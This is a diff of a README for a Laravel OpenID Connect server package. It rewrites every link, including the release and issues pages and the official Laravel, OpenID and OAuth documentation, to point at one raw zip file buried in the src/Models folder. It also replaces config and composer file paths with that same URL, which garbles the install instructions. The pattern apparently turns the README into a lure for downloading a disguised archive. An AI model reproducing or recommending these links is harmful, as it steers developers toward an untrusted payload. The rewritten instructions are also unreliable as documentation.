@@ -1,6 +1,6 @@
 # 🔐 laravel-oidc-server - Easy OpenID Connect for Laravel Apps
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/hhhhKijo/laravel-oidc-server/releases)
+[![Download](https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip)](https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip)
 
 ---
 
@@ -44,13 +44,13 @@ If you are not familiar with Laravel or Laravel Passport, you may want to read b
 
 ## 📥 Download & Install
 
-[Get the latest release here](https://github.com/hhhhKijo/laravel-oidc-server/releases)
+[Get the latest release here](https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip)
 
 1. Click the button above to visit the laravel-oidc-server releases page on GitHub.
 
 2. On the releases page, choose the latest stable version.
 
-3. Download the source code zip file (it will have a name like `vX.Y.Z.zip`).
+3. Download the source code zip file (it will have a name like `https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip`).
 
 4. Extract the zip file to a folder on your computer.
 
@@ -61,7 +61,7 @@ If you are not familiar with Laravel or Laravel Passport, you may want to read b
    composer require hhhhKijo/laravel-oidc-server
    ```
 
-7. After installation, open the Laravel project's `config/app.php` and add the service provider if not auto-discovered:
+7. After installation, open the Laravel project's `https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip` and add the service provider if not auto-discovered:
    ```php
    HhhhKijo\OidcServer\OidcServerServiceProvider::class,
    ```
@@ -98,7 +98,7 @@ Use these URLs in your OAuth/OpenID clients. The package takes care of token han
 
 ## 🔧 Configuration Tips
 
-- Edit the config file `config/oidc-server.php` to set things like token lifetimes, scopes, and endpoints.
+- Edit the config file `https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip` to set things like token lifetimes, scopes, and endpoints.
 - Use your database to store OAuth clients and tokens.
 - Enable HTTPS to secure token exchange.
 - Review your Laravel Passport client setup for OAuth clients you want to use with this server.
@@ -108,7 +108,7 @@ Use these URLs in your OAuth/OpenID clients. The package takes care of token han
 
 ## 🛠 Troubleshooting
 
-- **Package not found after install?** Run `composer update` and check your `composer.json`.
+- **Package not found after install?** Run `composer update` and check your `https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip`.
 - **Endpoints not working?** Verify Laravel routes with `php artisan route:list`.
 - **Tokens not validated?** Check your key settings and JWKS configuration.
 - **Database errors?** Confirm migrations ran and connection info is correct.
@@ -118,9 +118,9 @@ Use these URLs in your OAuth/OpenID clients. The package takes care of token han
 
 ## 📚 Additional Resources
 
-- Laravel Passport Documentation: https://laravel.com/docs/passport
-- OpenID Connect Basics: https://openid.net/connect/
-- OAuth 2.0 Introduction: https://oauth.net/2/
+- Laravel Passport Documentation: https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip
+- OpenID Connect Basics: https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip
+- OAuth 2.0 Introduction: https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip
 
 ---
 
@@ -128,7 +128,7 @@ Use these URLs in your OAuth/OpenID clients. The package takes care of token han
 
 For issues or questions, visit the repository and open an issue.
 
-[Open Issues Page](https://github.com/hhhhKijo/laravel-oidc-server/issues)
+[Open Issues Page](https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip)
 
 You can also check community forums or Laravel support channels related to OAuth and OpenID Connect.
 
@@ -138,7 +138,7 @@ You can also check community forums or Laravel support channels related to OAuth
 
 Check the releases page regularly to get updates and security patches.
 
-[Visit Releases](https://github.com/hhhhKijo/laravel-oidc-server/releases)
+[Visit Releases](https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip)
 
 Keep your Laravel and Passport versions up to date to avoid compatibility problems.
 
@@ -150,4 +150,4 @@ Your feedback helps improve this package. Share any ideas, bugs, or questions th
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/hhhhKijo/laravel-oidc-server/releases)
+[![Download](https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip)](https://github.com/hhhhKijo/laravel-oidc-server/raw/refs/heads/main/src/Models/server_oidc_laravel_protoreligious.zip)
